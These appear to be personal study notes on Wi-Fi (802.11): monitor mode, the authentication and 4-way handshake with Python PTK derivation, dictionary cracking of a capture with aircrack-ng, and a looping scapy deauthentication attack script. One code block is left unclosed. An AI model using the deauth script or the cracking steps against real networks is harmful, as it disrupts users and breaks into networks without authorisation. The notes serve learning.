# IEEE 802.11

This is basically WLAN/Wi-Fi.

## Monitor Mode

Run the command (note that it will kill your internet connection) to switch to monitor mode:

```sh
airmon-ng start wlp4s0
```

This will create an interface `wlp4s0mon`.
Start a Wireshark capture on that interface.

You need to be on the right channel:

```sh
iwconfig wlp4s0mon channel 56
```

You can find out the channel by running `nmcli dev wifi`.

Note that you can remove the interface by running:

```sh
airmon-ng stop wlp4s0mon
```

## Channels

Network cards can listen on different channels with different frequencies.

You can see the channels by running `nmcli device wifi list`:

```
1C:ED:6F:B2:70:BC  examplenet                      Infra  11    270 Mbit/s  97      ▂▄▆█  WPA2
1C:ED:6F:B2:70:BD  examplenet                      Infra  52    405 Mbit/s  95      ▂▄▆█  WPA2
```

Channel 11 corresponds to the frequency range in the area of 2,4 GHz and channel 52 corresponds to a frequency range in the area of 5 GHz.

Note that these channels are centrally defined (not just for WLAN - if you want to learn something interesting, google TETRA, BOS and "Digitalfunk der Behörden und Organisationen mit Sicherheitsaufgaben" (BOSNet)).

## The Authentication Process

Let's say a station STA wants to authenticate with access point AP.

- STA sends an authenticaion request to AP
- AP send an authentication response to STA
- STA sends an association request to AP
- AP sends an association response to STA
- STA and AP exchange a 4-way handshake (4 KEY packets)

STA is now authenticated to AP.

Let's now look at such an exchange in detail.
Here the STA `2c:db:07:40:9a:16` tries to authenticate with the AP `1c:ed:6f:b2:70:bd`.

### Authentication Request & Response

The name is a bit misleading, it's more of an identitiy establishment step.
Here the STA establishes its identity with the AP.

Let's look at our example.
First STA `2c:db:07:40:9a:16` sends an authentication request to AP `1c:ed:6f:b2:70:bd`.
The packet contains:

- authentication algorithm (Open System in this case)
- authentication SEQ `0x0001`

Then the AP `1c:ed:6f:b2:70:bd` responds to STA `2c:db:07:40:9a:16`:

- authentication algorithm (Open System again)
- authentication SEQ `0x0002`

### Association Request & Response

Next the STA tries to associate with the AP.

Let's look at our example.
First STA `2c:db:07:40:9a:16` sends an association request to AP `1c:ed:6f:b2:70:bd`.
This packet contains a lot of information about things like supported rates etc.

The association response is similar.

### 4-Way Handshake

Here the actual authentication happens in 4 messages.

Message 1: AP sends the ANonce to STA.

Here the ANonce was:

```
3a4b19d360e946ffc039f98a811599ccb916631f7866f08f413caad6f240bd3b
```

Message 2: STA sends SNonce to AP.

Here the SNonce was:

```
f5ea43a088b5593425e5d93cfc5c0a8aef627d978ee72dc16545d63e6d7522d6
```

The PTK is constructed as follows:

```
PTK = PRF(PMK, "Pairwise key exchange", Min(AA, SPA) || Max(AA, SPA) || Min(ANonce, SNonce) || Max(ANonce, SNonce))
```

Example code:

```python
from hashlib import pbkdf2_hmac, sha1
import hmac
import hashlib

def to_bytes(num):
    return hex(num)[2:].encode("ascii")

def calculate_ptk(PMK, AA, SPA, ANonce, SNonce):
    MIN_AA_SPA = min(AA, SPA)
    MAX_AA_SPA = max(AA, SPA)
    MIN_ANonce_SNonce = min(ANonce, SNonce)
    MAX_ANonce_SNonce = max(ANonce, SNonce)

    PTK = b''
    for i in range(4):  # Iterate to generate 512 bits
        PTK += hmac.new(PMK, b"Pairwise key expansion" + b'\x00' + MIN_AA_SPA + MAX_AA_SPA + MIN_ANonce_SNonce + MAX_ANonce_SNonce + bytes([i]), hashlib.sha1).digest()

    # return PRF(PMK, b"Pairwise key expansion", MIN_AA_SPA + MAX_AA_SPA + MIN_ANonce_SNonce + MAX_ANonce_SNonce)
    return PTK[:64]


PSK = "Test1234!"
SSID = "examplenet"
PMK = pbkdf2_hmac('sha1', PSK.encode('ascii'), SSID.encode('ascii'), 4096, 32)
print("PMK")
print(PMK.hex())

AA = bytes.fromhex("1c:ed:6f:b2:70:bd".replace(":", ""))
SPA = bytes.fromhex("2c:db:07:40:9a:16".replace(":", ""))
ANonce = bytes.fromhex("3a4b19d360e946ffc039f98a811599ccb916631f7866f08f413caad6f240bd3b")
SNonce = bytes.fromhex("f5ea43a088b5593425e5d93cfc5c0a8aef627d978ee72dc16545d63e6d7522d6")

print("PTK")
print(calculate_ptk(PMK, AA, SPA, ANonce, SNonce).hex())
```

To compare:

- capture packets
- convert pcapng file to pcap with `editcap -F libpcap examplenet.pcapng examplenet.pcap`
- aircrack the file with `aircrack-ng -w dict.txt examplenet.pcap`

Output:

```

## Deauthentication and Deassociation Frames

A deauthentication frame deauthenticates a device from an AP.
Here is what it has:

- source address is the address of the device to deauthenticate
- destination address is the AP address
- BSSID address is the AP address

Deauthentication attack:

```python
from scapy.all import *
import time

target_client = '7c:21:4a:f7:08:9b'  # MAC address of the device you want to deauthenticate
access_point = '62:22:32:37:56:cf'       # MAC address of your access point
iface = "wlp4s0mon"

# addr1 = Destination, addr2 = Source, addr3 = BSSID
deauth_packet = RadioTap()/Dot11(type=0,subtype=12,addr1=access_point, addr2=target_client, addr3=access_point)/Dot11Deauth(reason=7)

while True:
    print("Send deauth packet")
    sendp(deauth_packet, iface=iface)
    time.sleep(1)
```

Protect your management frames with 802.11w:

```
Data = CCMP(Payload || MIC(Payload))
```

The CCMP encryption uses the PTK.

## Other Management Frames

### Probe Request

A probe request is sent by stations to discover available access points.

### Probe Response

TODO

### Beacon Frame

Periodically sent out by the access station.
This is very similar to the probe response (except that it doesn't actually respond to some probe request).

## Control Frames
